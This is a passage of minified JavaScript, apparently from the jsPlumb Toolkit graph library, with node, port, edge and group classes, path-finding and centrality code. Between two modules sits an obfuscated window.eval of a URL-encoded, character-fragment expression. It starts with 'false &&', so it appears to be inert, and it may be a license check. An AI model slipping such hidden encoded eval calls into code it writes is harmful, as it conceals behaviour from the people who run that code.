n={};this.setAttribute=function(t,e){n[t]=e},this.getAttribute=function(t){return n[t]};var o=e.getType(t||{});this.getType=function(){return o},this.setType=function(t){o=t},this.graph=e},n=function(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(t){var e=16*Math.random()|0;return("x"==t?e:3&e|8).toString(16)})},o=function(t,e,o){return null==t?n():"string"==typeof t?t:(e||o.getIdFunction())(t)||n()},i=t.Vertex=t.Node=function(n,i,s){var a;e.apply(this,[n,s]),this.objectType="Node",this.id=o(n,i,s),this.data="string"==typeof(a=n)?{id:a}:a,this.getFullId=function(){return this.id};var l=[],d=0,u=0,c=[],h=[],p={};this.getEdges=function(t){if(null==t||null==t.filter)return l;for(var e=[],n=0;n<l.length;n++)t.filter(l[n])&&e.push(l[n]);return e},this.getSourceEdges=function(){return this.getEdges({filter:function(t){return t.source==this}.bind(this)})},this.getTargetEdges=function(){return this.getEdges({filter:function(t){return t.target==this}.bind(this)})},this.addEdge=function(t){l.push(t),t.source!==this&&t.isDirected()||u++,t.target!==this&&t.isDirected()||d++},this.deleteEdge=function(t){for(var e=-1,n=0;n<l.length;n++)if(l[n].getId()===t.getId()){e=n;break}return e>-1&&(l.splice(e,1),t.source!==this&&t.isDirected()||u--,t.target!==this&&t.isDirected()||d--,!0)},this.getAllEdges=function(t){for(var e=this.getEdges(t).slice(0),n=0;n<c.length;n++)e.push.apply(e,c[n].getEdges(t));return e},this.addGraph=function(e){return e="string"==typeof e?new t.Graph({id:e}):e,h.push(e),e.id||(e.id=""+h.length),e},this.getGraph=function(t){for(var e=0;e<h.length;e++)if(h[e].id===t)return h[e]},this.getIndegreeCentrality=function(){for(var t=0,e=0;e<c.length;e++)t+=c[e].getIndegreeCentrality();return d+t},this.getOutdegreeCentrality=function(){for(var t=0,e=0;e<c.length;e++)t+=c[e].getOutdegreeCentrality();return u+t},this.getPorts=function(){return c},this.addPort=function(t,e){var n=o(t,e,s),i=this.getPort(n);return null==i&&(i=new r(t,e,this),c.push(i),p[i.id]=i),i},this.setPort=function(t,e){var n=this.getPort(t);return n||(n=this.addPort({id:t})),n.data=e,n.setType(this.graph.getType(e)),n},this.getPort=function(t){return p[t]};var f=function(e){return e.constructor==t.Port?e.id:e};this.removePort=function(t){if(t){for(var e=f(t),n=-1,o=!1,i=0;i<c.length;i++)if(c[i].id===e){n=i;break}if(-1!=n){var r=c[n];s.deleteVertex(r),c.splice(n,1),o=!0}delete p[e]}return o};var g=0,_={};this.setDefaultInternalCost=function(t){g=t},this.getInternalEdge=function(t,e){var n=f(t),o=f(e),i={source:p[n],target:p[o],cost:1/0};if(i.source&&i.target){var r=_[n+"-"+o]||{cost:g,directed:!1};for(var s in r)i[s]=r[s]}return i},this.setInternalEdge=function(t,e,n,o){var i=f(t),r=f(e);return _[i+"-"+r]={cost:n||g,directed:o},this.getInternalEdge(t,e)},this.inspect=function(){for(var t="{ id:"+this.id+", edges:[\n",e=0;e<l.length;e++)t+=l[e].inspect()+"\n";return t+"]}"}},r=t.Port=function(t,e,n){i.apply(this,[t,e,n.graph]),this.objectType="Port",this.getNode=function(){return n},this.getFullId=function(){return n.id+this.graph.getPortSeparator()+this.id},this.isChildOf=function(t){return n==t},this.getPorts=this.addPort=this.deletePort=this.getPort=null},s=t.Edge=function(t){e.call(this,t.data,t.graph),this.source=t.source,this.target=t.target,this.objectType="Edge";var n=t.cost||1,o=!(!1===t.directed),i=t.id;this.data=t.data||{},this.getCost=function(){return n},this.setCost=function(t){n=t},this.getId=this.getFullId=function(){return null===i?this.source.id+"_"+this.target.id:i},this.setId=function(t){i=t},this.isDirected=function(){return o},this.setDirected=function(t){o=t},this.inspect=function(){if(null!=i)return"{ id:"+i+", connectionId:null, cost:"+n+", directed:"+o+", source:"+this.source.id+", target:"+this.target.id+"}"}},a=t.Group=function(t,e,n){i.apply(this,arguments),this.objectType="Group";var o=[],r={};this.addVertex=this.addNode=function(t){return null==r[t.id]&&(o.push(t),r[t.id]=t,t.group=this,!0)},this.getVertexCount=this.getNodeCount=function(){return o.length},this.getVertices=this.getNodes=function(){return o},this.deleteVertex=this.deleteNode=function(t){if(t="string"==typeof t?r[t]:t){var e=o.indexOf(t);-1!=e&&(o.splice(e,1),delete r[t.id]),delete t.group}},this.cleanup=function(t){var e,i=this.getAllDirectEdges(),r=i.length;for(e=0;e<r;e++)n.deleteEdge(i[0]);var s=o.length;for(e=0;e<s;e++)t?n.deleteVertex(o[0]):delete o[0].group;o.length=0},this.getAllDirectEdges=function(t){var e,n=[];n.push.apply(n,this.getEdges(t).slice(0));var o=this.getPorts();for(e=0;e<o.length;e++)n.push.apply(n,o[e].getEdges(t));return n},this.getAllEdges=function(t){for(var e=[],n={},i=0;i<o.length;i++)Array.prototype.push.apply(e,o[i].getAllEdges(t).filter(function(t){var e=t.getId(),o=null==n[e];return n[e]=!0,o}));return e.push.apply(e,this.getAllDirectEdges(t)),e}},l=t.Cluster=function(t){this.vertices=[t],this.addVertex=function(t){this.vertices.push(t)}},d=(t.Graph=function(e){e=e||{},this.vertices=[],this.edges=[],this.groups=[],this.id=e.id;var n={},r=0,d={},u=0,c={},f=0,g=!(!1===e.defaultDirected),_=e.defaultCost||1,b=e.idFunction||function(t){return t.id},v=e.typeFunction||function(t){return t.type||"default"},m=!0===e.enableSubgraphs,w=e.portSeparator||".",j={},y=function(t){delete j[t.id]},P=function(t){j[t.id]=t};this.setIdFunction=function(t){b=t},this.getIdFunction=function(){return b},this.setTypeFunction=function(t){v=t},this.getType=function(t){return v(t)},this.getTopLevelElements=function(){return j},this.setEnableSubgraphs=function(t){m=t},this.setPortSeparator=function(t){w=t},this.getPortSeparator=function(){return w};var E=function(e,o){if(null==e)return null;if("string"!=typeof e){if(e.constructor==t.Port||e.constructor==t.Node||e.constructor==t.Group)return e;var i=e;if("string"!=typeof(e=b(e)))return i}var r=m?e.split("/"):[e],s=function(t){if(n[t])return n[t];if(c[t])return c[t];var e=t.split(w),i=e[0],r=n[i]||c[i];if(2===e.length&&null!=r){var s=r.getPort(e[1]);return null==s&&o&&(s=r.addPort(e[1])),s}return r};if(1==r.length)return s(r[0]);if(r.length>1&&r%2==0)throw"Subgraph path format error.";for(var a=null,l=null,d=0;d<r.length-1;d+=2)a=s(r[d]),l=a.getGraph(r[d+1]);return l.getVertex(r[r.length-1])};this.clear=function(){this.vertices.length=0,this.groups.length=0,r=0,u=0,n={},d={},c={},j={}},this.getVertices=this.getNodes=function(){return this.vertices},this.getVertexCount=this.getNodeCount=function(){return this.vertices.length},this.getVertexAt=this.getNodeAt=function(t){return this.vertices[t]},this.getEdgeCount=function(){return u},this.addEdge=function(t,e,n){var i=null==t.directed?!0===g:!(!1===t.directed),r=t.cost||_,a=o(t.data,e,this),l=E(t.source,!0),c=E(t.target,!0);if(null==l||null==l.objectType)throw new TypeError("Unknown source node ["+t.source+"]");if(null==c||null==c.objectType)throw new TypeError("Unknown target node ["+t.target+"]");if(n&&!n(l,c))return null;var h=new s({source:l,target:c,cost:r,directed:i,data:t.data||{},id:a,graph:this});return h.source.addEdge(h),h.source!==h.target&&h.target.addEdge(h),d[a]=h,u++,h},this.addVertex=this.addNode=function(t,e){var o=new i(t,e||b,this);return n[o.id]?null:(this.vertices.push(o),n[o.id]=o,o._id=r++,P(o),o)},this.addVertices=this.addNodes=function(t,e){for(var n=0;n<t.length;n++)this.addVertex(t[n],e||b)},this.addGroup=function(t,e){var n=new a(t,e||b,this);return c[n.id]?c[n.id]:(this.groups.push(n),c[n.id]=n,n._id=f++,P(n),n)},this.getGroupCount=function(){return this.groups.length},this.getGroupAt=function(t){return this.groups[t]},this.getGroups=function(){return this.groups},this.addVertexToGroup=function(t,e){e="string"==typeof e?c[e]:e,(t=E(t))&&e&&(e.addVertex(t),y(t))},this.addVerticesToGroup=function(t,e){for(var n=0;n<t.length;n++)this.addVertexToGroup(t[n],e)},this.deleteVertexFromGroup=function(t){(t=E(t))&&t.group&&(t.group.deleteVertex(t),P(t))},this.deleteVerticesFromGroup=function(t,e){for(var n=0;n<t.length;n++)this.deleteVertexFromGroup(t[n],e)},this.deleteGroup=function(t,e){if(t="string"==typeof t?c[t]:t){t.cleanup(e),delete c[t.id];for(var n=-1,o=0;o<this.groups.length;o++)if(this.groups[o].id===t.id){n=o;break}return n>-1&&this.groups.splice(n,1),y(t),t}},this.getGroup=function(t){return"string"==typeof t?c[t]:t},this.deleteVertex=this.deleteNode=function(t){var e=E(t);if(e){for(var o=-1,i=0;i<this.vertices.length;i++)if(this.vertices[i].id===e.id){o=i;break}o>-1&&(this.vertices.splice(o,1),null!=e.group&&e.group.deleteVertex(e));for(var s=e.getEdges(),a=0;a<s.length;a++)this.deleteEdge(s[a]);if(u-=s.length,e.getPorts)for(var l=e.getPorts(),d=0;d<l.length;d++)this.deleteVertex(l[d]);delete n[e.id],r--,y(e)}},this.deleteEdge=function(t){if(null!=(t=this.getEdge(t))){var e=E(t.source);e&&e.deleteEdge(t)&&u--;var n=E(t.target);n&&n.deleteEdge(t),delete d[t.getId()]}},this.getEdge=function(e){if(null!=e){if("string"!=typeof e){if(e.constructor==t.Edge)return e;var n=e;if("string"!=typeof(e=b(e)))return n}return d[e]}},this.getEdges=function(t){var e,n=(t=t||{}).source,o=t.target,i=t.filter||function(){return!0},r=[],s=function(t){var e;i(t)&&(e=t,!(null!=n&&e.source==a!==n||null!=o&&e.target==a!==o))&&r.push(t)};if(t.node){var a=E(t.node),l=a.getAllEdges();for(e=0;e<l.length;e++)s(l[e])}else for(e in d)s(d[e]);return r},this.getAllEdges=function(){var t=[];for(var e in d)t.push(d[e]);return t},this.findPath=function(t,e,n,o,i){return t=E(t),e=E(e),p.compute({graph:this,source:t,target:e,strict:!(!1===n),nodeFilter:o,edgeFilter:i})},this.getDistance=function(t,e,n){return this.findPath(t,e,n).pathDistance},this.getVertex=this.getNode=E,this.setTarget=function(t,e){if(null==(e=E(e)))return{success:!1};var n=t.target;return t.target.deleteEdge(t),t.target=e,e.addEdge(t),{old:n,edge:t,new:e,success:!0}},this.setSource=function(t,e){if(null==(e=E(e)))return{success:!1};var n=t.source;return t.source.deleteEdge(t),t.source=e,e.addEdge(t),{old:n,edge:t,new:e,success:!0}},this.printPath=function(t,e){t=E(t),e=E(e);for(var n=this.findPath(t,e).path,o="["+t.id+" - "+e.id+"] : ",i=0;i<n.length;i++)o=o+"{ vertex:"+n[i].vertex.id+", cost:"+n[i].cost+", edge: "+(n[i].edge&&n[i].edge.getId())+" } ";return o},this.getDiameter=function(t){for(var e=0,n=0;n<this.vertices.length;n++)for(var o=0;o<this.vertices.length;o++)if(o!=n){var i=p.compute({graph:this,source:this.vertices[n],target:this.vertices[o]});if(null==i.path||0==i.path.length){if(!t)return 1/0}else e=Math.max(e,i.pathDistance)}return e},this.diameter=this.getDiameter,this.getCentrality=function(t){return((t=E(t)).getIndegreeCentrality()+t.getOutdegreeCentrality())/(this.getVertexCount()-1)},this.getDegreeCentrality=this.getCentrality,this.getIndegreeCentrality=function(t){return(t=E(t)).getIndegreeCentrality()/(this.getVertexCount()-1)},this.getOutdegreeCentrality=function(t){return(t=E(t)).getOutdegreeCentrality()/(this.getVertexCount()-1)},this.getCloseness=function(t){return 1/this.getFarness(t)},this.getFarness=function(t){t=E(t);var e=p.compute({graph:this,source:t,target:t,processAll:!0}),n=0;for(var o in e.dist)n+=e.dist[o];return n/(this.getVertexCount()-1)},this.getBetweenness=function(t){var e=this.getVertexCount(),n=(e-1)*(e-2)/2,o=0,i=function(t,e,n,o,r){var s=n.parents[t][e];if(0==s.length)(l=o.slice()).unshift(t),r.push(l);else for(var a=0;a<s.length;a++)if(-1==o.indexOf(s[a][0].id)){var l;(l=o.slice()).unshift(s[a][0].id),i(t,s[a][0].id,n,l,r)}};t=E(t);var r=h.compute({graph:this,focus:t});for(var s in r.paths)for(var a in r.paths[s])if(s!=a){var l=[],d=0;i(s,a,r,[a],l);for(var u=0;u<l.length;u++){var c=l[u].indexOf(t.id);c>0&&c<l[u].length-1&&d++}o+=d/l.length,d}return o/n},this.inspect=function(){for(var t="",e=0;e<this.vertices.length;e++)t+=this.vertices[e].inspect()+"\n";return t},this.serialize=function(){for(var t,e,n,o,i={nodes:[],edges:[],ports:[],groups:[]},r=0;r<this.vertices.length;r++){t=this.vertices[r],i.nodes.push(t.data),e=t.getAllEdges(),n=t.getPorts();for(var s=0;s<e.length;s++)if(e[s].source==t||"Port"===e[s].source.objectType&&e[s].source.getNode()==t){var a={source:e[s].source.getFullId(),target:e[s].target.getFullId()};e[s].data&&(a.data=e[s].data),i.edges.push(a)}for(var l=0;l<n.length;l++){var d={};for(var u in n[l].data)d[u]=n[l].data[u];d.id=n[l].getFullId(),i.ports.push(d)}}for(r=0;r<this.groups.length;r++){o=this.groups[r],i.groups.push(o.data),e=o.getEdges();for(s=0;s<e.length;s++)if(e[s].source===o){a={source:o.getFullId(),target:e[s].target.getFullId()};e[s].data&&(a.data=e[s].data),i.edges.push(a)}}return i},this.getClusters=function(){var t,e=[],n={},o=function(t,i){if(null!=t&&!n[t.id]){null==i?(i=new l(t),e.push(i)):i.addVertex(t),n[t.id]=!0;for(var r=t.getAllEdges(),s=0;s<r.length;s++){var a=r[s].source===t?r[s].target:r[s].source;o(a,i)}}};for(t=0;t<this.vertices.length;t++)o(this.vertices[t]);for(t=0;t<this.groups.length;t++)o(this.groups[t]);return e}},function(t,e,n,o,i){for(var r=-1,s=null,a=1/0,l=0;l<t.length;l++)if(!e[l]){var d=i(t[l]);d<a&&(a=d,r=l,s=t[l])}return{node:s,index:r}}),u=function(t,e){var n=e.getFullId(),o=t[n];return null==o&&(o=t[n=e.getNode?e.getNode().id:e.id]),null==o?null:{p:o,id:n}},c=function(t,e,n,o,i,r){for(var s=[],a=o,l=u(e,a);null!=l;)s.splice(0,0,{vertex:a,cost:t[l.id],edge:n[l.id]}),a=l.p,l=u(e,a);return s.splice(0,0,{vertex:a,cost:0,edge:null}),s},h={getPath:function(t,e,n,o){if(t[n.id][o.id]==1/0)return null;var i=e[n.id][o.id];return null==i?" ":h.getPath(t,e,n,i)+" "+i.id+" "+h.getPath(t,e,i,o)},getPaths:function(t,e,n,o,i){if(t[n.id][o.id]==1/0)return null;var r=e[n.id][o.id];return 0==r.length?" ":h.getPaths(t,e,n,r[0])+" "+r[0].id+" "+h.getPaths(t,e,r[0],o)},compute:function(t){var e,n,o,i=t.graph,r=i.getVertexCount(),s={},a={};for(e=0;e<r;e++){var l=i.getVertexAt(e);for(s[l.id]||(s[l.id]={}),a[l.id]||(a[l.id]={}),s[l.id][l.id]=0,n=0;n<r;n++)if(e!=n){var d=i.getVertexAt(n);s[l.id][d.id]||(s[l.id][d.id]=1/0),a[l.id][d.id]||(a[l.id][d.id]=[])}var u=l.getEdges();for(o=0;o<u.length;o++)u[o].source==l?s[l.id][u[o].target.id]=u[o].getCost():(s[u[o].source.id]||(s[u[o].source.id]={},a[u[o].source.id]={}),s[l.id][u[o].source.id]=u[o].getCost())}for(o=0;o<r;o++)for(e=0;e<r;e++)for(n=0;n<r;n++)if(e!=n&&n!=o&&e!=o){var c=i.getVertexAt(e).id,h=i.getVertexAt(n).id,p=i.getVertexAt(o).id;s[c][p]+s[p][h]<=s[c][h]&&s[c][p]+s[p][h]!=1/0&&(s[c][h]=s[c][p]+s[p][h],a[c][h]||(a[c][h]=[]),a[c][h].unshift([i.getVertexAt(o),s[c][h]]))}return{paths:s,parents:a}}},p={compute:function(t){for(var e=t.graph,n=t.source,o=t.target,i=t.nodeFilter,r=t.edgeFilter,s={},a={},l={},u={dist:s,previous:a,edges:l,path:[]},h=t.processAll,p={},f={},g=!(!1===t.strict),_=function(t){return t.getFullId?t.getFullId():t.id},b=[],v=function(t){var e=f[t.getFullId()];return p[e.v.id]},m=function(t,e){var n,o;if("Port"===t.objectType){for(s[t.getFullId()]=e,n=v(t),o=0;o<n.length;o++)n[o].p!=t&&(s[n[o].p.getFullId()]=e+t.getNode().getInternalEdge(t,n[o].p).cost);g||(s[t.getNode().id]=e)}else for(s[t.id]=e,n=p[t.id],o=0;o<n.length;o++)s[n[o].p.getFullId()]=e},w=function(t){return i&&!i(t)?1/0:s[_(t)]},j=function(t,e,n){if("Port"===t.objectType){for(var o=v(t),i=0;i<o.length;i++)a[o[i].p.getFullId()]=n.node;g||(a[t.getNode().id]=n.node)}a[e]=n.node},y=function(t,e,n){if("Port"===t.objectType){for(var o=v(t),i=0;i<o.length;i++)l[o[i].p.getFullId()]=n;g||(l[t.getNode().id]=n)}l[e]=n},P=0;P<e.vertices.length;P++){var E=e.vertices[P],x=E.getPorts();b.push(E);var C={v:E,i:b.length-1};p[E.id]=[],m(E,1/0);for(var S=0;S<x.length;S++)b.push(x[S]),f[x[S].getFullId()]=C,p[E.id].push({p:x[S],i:b.length-1}),m(x[S],1/0)}if(null==n&&(n=e.getVertex(t.sourceId)),null==o&&(o=e.getVertex(t.targetId)),null==n||null==o)return u;n.getNode&&n.getNode(),o.getNode&&o.getNode(),m(n,0);for(var I=new Array(e.vertices.length),A=0,T=function(t,e,n,o){for(var i=0;i<e.length;i++){var r=e[i];if(n(r)){var s=o(r),a=s.tp||s.tn,l=_(a),d=w(t.node)+r.getCost();d<w(a)&&(m(a,d),j(a,l,t),y(a,l,r))}}};A<b.length;){var k=d(b,I,s,_,w),D=k.node?_(k.node):null;if(!k.node||w(k.node)==1/0)break;if(o&&(D==_(o)||!g&&k.node.isChildOf&&k.node.isChildOf(o))&&(u.path=c(s,a,l,o),u.pathDistance=u.path[u.path.length-1].cost,!h))break;I[k.index]=!0,A+=1,T(k,k.node.getAllEdges(),function(t){return!(r&&!r(t))&&(!t.isDirected()||k.node==t.source||!g&&t.source.isChildOf&&t.source.isChildOf(k.node))},function(t){var e=t.source.getNode?t.source.getNode():t.source,n=t.source.getNode?t.source:null,o=t.target.getNode?t.target.getNode():t.target,i=t.target.getNode?t.target:null;return t.source==k.node||!g&&t.source.isChildOf&&t.source.isChildOf(k.node)?{tn:o,tp:i}:{tn:e,tp:n}})}return u}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this,e=t.jsPlumbUtil,n=t.jsPlumb,o=t.jsPlumbToolkitUtil,i=t.jsPlumbGraph,r="default",s=function(t){return t.id};t.jsPlumbToolkitInstance=function(a){var l=(a=a||{}).idFunction||s,d=a.typeProperty||"type",u=a.edgeTypeProperty||"type",c=a.portTypeProperty||"type",h=a.typeFunction||function(t){return t[d]||r},p=a.edgeIdFunction||l,f=a.edgeTypeFunction||function(t){return t[u]||r},g=a.portIdFunction||l,_=a.portTypeFunction||function(t){return t[c]||r},b=a.portExtractor,v=a.portUpdater,m=a.portDataProperty,w=this,j=!1,y=!1,P=a.model||{},E=function(t,n,i){n=null!=n&&e.isObject(n)?n:{},(n=e.clone(n)).id=n.id||o.uuid(),n.type=n.type||(null==t?null:t.type||t),i(n)},x=a.nodeFactory||E,C=a.edgeFactory||E,S=a.portFactory||E,I=a.groupFactory||E,A=a.autoSave&&a.saveUrl,T=a.saveUrl,k=a.saveHeaders,D=a.onAutoSaveSuccess||function(){},N=a.onAutoSaveError||function(){},M=!0===a.doNotUpdateOriginalData,O=a.onBeforeAutoSave||function(){},F=a.onAfterAutoSave||function(){},L={portSeparator:a.portSeparator,defaultCost:a.defaultCost,defaultDirected:a.defaultDirected,enableSubgraphs:a.enableSubgraphs},R=!0===a.createMissingGroups;null!=m&&null==b&&(b=function(t){return t[m]||[]}),null!=m&&null==v&&(v=function(t,e,n){var o={};return o[m]=jsPlumbToolkitUtil.map(n,function(t){return t.data}),jsPlumb.extend(t,o)}),e.EventGenerator.apply(this,arguments);var G=new i.Graph(L);A&&new o.AutoSaver(this,T,k,D,N,O,F),new o.CatchAllEventHandler(this),this.getNodeFactory=function(){return x},this.getGroupFactory=function(){return I},this.getEdgeFactory=function(){return C},this.getPortFactory=function(){return S},this.setNodeFactory=function(t){x=t},this.setGroupFactory=function(t){I=t},this.setEdgeFactory=function(t){C=t},this.setPortFactory=function(t){S=t},this.setDebugEnabled=function(t){y=t},this.isDebugEnabled=function(){return y},this.getModel=function(){return P||{}};var U,z=function(e,n){if(null==P)return!0;var o=this.getType(e),i=this.getType(n),r=(null==U&&(U=new t.jsPlumbToolkit.Model(P||{})),U),s=e.getNode?e.getNode():e,a=n.getNode?n.getNode():n,l="Node"===e.objectType?r.getNodeDefinition(o):r.getPortDefinition(o),d="Node"===n.objectType?r.getNodeDefinition(i):r.getPortDefinition(i),u=this.getNodeType(s),c=this.getNodeType(a),h=r.getNodeDefinition(u),p=r.getNodeDefinition(c);return!(null!=l.maxConnections&&e.getEdges().length>=l.maxConnections||null!=d.maxConnections&&n.getEdges().length>=d.maxConnections||(e==n?!1===h.allowLoopback||!1===l.allowLoopback||!1===d.allowLoopback||!1===p.allowLoopback:s==a&&(!1===h.allowNodeLoopback||!1===l.allowNodeLoopback||!1===d.allowNodeLoopback||!1===p.allowNodeLoopback)))}.bind(this);this.beforeConnect=a.beforeConnect||z,this.beforeMoveConnection=a.beforeMoveConnection||z,this.beforeStartConnect=a.beforeStartConnect||function(t,e){return{}},this.beforeDetach=a.beforeDetach||function(t,e,n){return!0},this.beforeStartDetach=a.beforeStartDetach||function(t,e){return!0},this.setSuspendGraph=function(t){j=t},this.setDoNotUpdateOriginalData=function(t){M=t},this.getTypeFunction=function(){return h},this.connect=function(t){var e;if(t=t||{},!j){var o=G.getVertex(t.source),i=G.getVertex(t.target),r=t.cost,s=t.directed;if(!o){if(t.doNotCreateMissingNodes)return;o=G.addVertex(t.source),w.fire("nodeAdded",{data:{},node:o})}if(!i){if(t.doNotCreateMissingNodes)return;i=G.addVertex(t.target),w.fire("nodeAdded",{data:{},node:i})}var a=this.beforeStartConnect(o,f(t.data||{}));if(a){var l=t.data||{};"object"==typeof a&&n.extend(l,a),!1!==this.beforeConnect(o,i,l)&&(e=G.addEdge({source:o,target:i,cost:r,directed:s,data:l}),w.fire("edgeAdded",{edge:e}))}}return e},this.clear=function(){return this.fire("graphClearStart"),G.clear(),this.fire("graphCleared"),this},this.getGraph=function(){return G},this.getNodeCount=function(){return G.getVertexCount()},this.getNodeAt=function(t){return G.getVertexAt(t)},this.getNodes=function(){return G.getVertices()},this.eachNode=function(t){for(var e,n=0,o=G.getVertexCount();n<o;n++)e=G.getVertexAt(n),t(n,e)},this.eachGroup=function(t){for(var e,n=0,o=G.getGroupCount();n<o;n++)e=G.getGroupAt(n),t(n,e)},this.eachEdge=function(t){for(var e=G.getEdges(),n=0,o=e.length;n<o;n++)t(n,e[n])},this.getEdgeCount=function(){return G.getEdgeCount()},this.getGroupCount=function(){return G.getGroupCount()},this.getGroupAt=function(t){return G.getGroupAt(t)},this.getGroups=function(){return G.getGroups()},this.getClusters=function(){return G.getClusters()},this.getNodeId=function(t){return e.isObject(t)?l(t):t},this.getNodeType=function(t){return h(t)||"default"},this.getEdgeId=function(t){return e.isObject(t)?p(t):t},this.getEdgeType=function(t){return f(t)||"default"},this.getPortId=function(t){return e.isObject(t)?g(t):t},this.getPortType=function(t){return _(t)||"default"},this.getType=function(t){return("Node"===t.objectType?h:"Port"===t.objectType?_:f)(t.data)||"default"},this.setType=function(t,e){var n=this.getType(t);if(n!==e){var o="Node"===t.objectType?d:"Port"===t.objectType?c:u,i=t.objectType.charAt(0).toLowerCase()+t.objectType.substring(1)+"TypeChanged";t.data[o]=e,this.fire(i,{obj:t,previousType:n,newType:e})}},this.addNode=function(e,n,i){var r=l(e);null==r&&"string"!=typeof e&&(e.id=o.uuid());var s=G.addNode(e,l);if(null!=s){if(null!=b){var a=b(s.data,s);if(null!=a)for(var d=0;d<a.length;d++)s.addPort(a[d])}if("string"!=typeof e&&null!=e.group){var u=this.getGroup(e.group);null==u&&R&&(u=G.addGroup(e.group)),null!=u&&(u.addVertex(s),w.fire("group:addMember",{node:s,group:u}))}return Y||M||t.jsPlumbToolkitIO.manage("addNode",W,X,s,l||G.getIdFunction(),w),i||w.fire("nodeAdded",{data:e,node:s,eventInfo:n}),s}return G.getNode(r)},this.addFactoryNode=function(t,e,n){e=2!==arguments.length||null!=arguments[1]&&"object"!=typeof arguments[1]?{}:arguments[1],n=3===arguments.length?arguments[2]:"function"==typeof arguments[1]?arguments[1]:null,e.type=e.type||t,x(t,e,function(t){var e=this.addNode(t);n&&n(e)}.bind(this))},this.addNodes=function(t){for(var e=0;e<t.length;e++)w.addNode.apply(w,[t[e]]);return w},this.addGroup=function(e,n,i){null==l(e)&&"string"!=typeof e&&(e.id=o.uuid());var r=G.addGroup(e,l);return Y||M||t.jsPlumbToolkitIO.manage("addGroup",W,X,r,l||G.getIdFunction(),w),i||w.fire("groupAdded",{data:e,group:r,eventInfo:n}),r},this.addToGroup=function(t,e,n){var o=!1;if(t=w.getNode(t),e=w.getGroup(e),t&&e&&(o=e.addVertex(t))){t.data.group=e.id;var i={node:t,group:this.getGroup(e)};n&&(i.sourceGroup=n),w.fire("group:addMember",i),w.fire("dataUpdated")}return o},this.removeFromGroup=function(t,e,n){var o;if((t=w.getNode(t))&&t.group){if((o=t.group).deleteVertex(t),delete t.data.group,!e){var i={node:t,group:o};n&&(i.targetGroup=n),w.fire("group:removeMember",i)}w.fire("dataUpdated")}return o},this.removeGroup=function(e,n,o){var i=w.getObjectInfo(e);if(i&&i.obj){e=i.obj;var r=[];Array.prototype.push.apply(r,e.getNodes());var s=G.deleteGroup(e,n);return s&&(Y||M||t.jsPlumbToolkitIO.manage("removeGroup",W,X,s,l||G.getIdFunction(),w),o||w.fire("groupRemoved",{group:s,removeChildNodes:n,nodes:r})),w}},this.getNode=function(t){return G.getVertex(t)},this.getEdge=function(t){return G.getEdge(t)},this.getGroup=function(t){return G.getGroup(t)},this.exists=function(t){for(var e=0;e<arguments.length;e++)if(null==G.getVertex(arguments[e]))return!1;return!0},this.removeNode=function(e,n){for(var o=(e=e.constructor===i.Vertex||e.constructor===i.Port?e:G.getVertex(e)).getAllEdges()||[],r=0;r<o.length;r++)w.removeEdge(o[r]);return G.deleteVertex(e.id),Y||M||t.jsPlumbToolkitIO.manage("removeNode",W,X,e,l||G.getIdFunction(),w),n||w.fire("nodeRemoved",{node:e,nodeId:e.id,edges:o}),w},this.addEdge=function(e,n,o){var i=G.addEdge(e,p,this.beforeConnect);return Y||M||t.jsPlumbToolkitIO.manage("addEdge",W,X,i,p||G.getIdFunction(),w),o||w.fire("edgeAdded",{edge:i,source:n,geometry:e.geometry,addedByMouse:e.addedByMouse},null),i},this.removeEdge=function(e,n){return null!=(e=G.getEdge(e))&&(G.deleteEdge(e),Y||M||t.jsPlumbToolkitIO.manage("removeEdge",W,X,e,p||G.getIdFunction(),w),w.fire("edgeRemoved",{edge:e,source:n},null)),w},this.edgeMoved=function(t,e,n){return t[0===n?"source":"target"],this[0===n?"setSource":"setTarget"](t,e)},this.setTarget=function(t,e,n){var o=G.setTarget.apply(G,arguments);return!1===o.success||n||w.fire("edgeTarget",o),o},this.setSource=function(t,e,n){var o=G.setSource.apply(G,arguments);return!1===o.success||n||w.fire("edgeSource",o),o},this.addNewPort=function(e,n,o,i){e=G.getVertex(e),S({node:e,type:n},o,function(n){var o=g(n),r=e.addPort(o);r.data=n,B(e),Y||M||t.jsPlumbToolkitIO.manage("addPort",W,X,{node:e,port:r},g||G.getIdFunction(),w),i||w.fire("portAdded",{node:e,data:n,port:r},null)})},this.addPort=function(e,n,o){var i=e.addPort(n,g);return B(e),Y||M||t.jsPlumbToolkitIO.manage("addPort",W,X,{node:e,port:i},g||G.getIdFunction(),w),o||w.fire("portAdded",{node:e,data:n,port:i},null),i},this.removePort=function(t,e,n){var o=!1,r=(t=t.constructor===i.Vertex||t.constructor===i.Port?t:G.getVertex(t)).getPort(e);if(r){var s=r.getAllEdges();if((o=t.removePort(r))&&!n){B(t),w.fire("portRemoved",{node:t,port:r,edges:s},null);for(var a=0;a<s.length;a++)w.removeEdge(s[a])}}return o},this.remove=function(t){if(null!=t){var 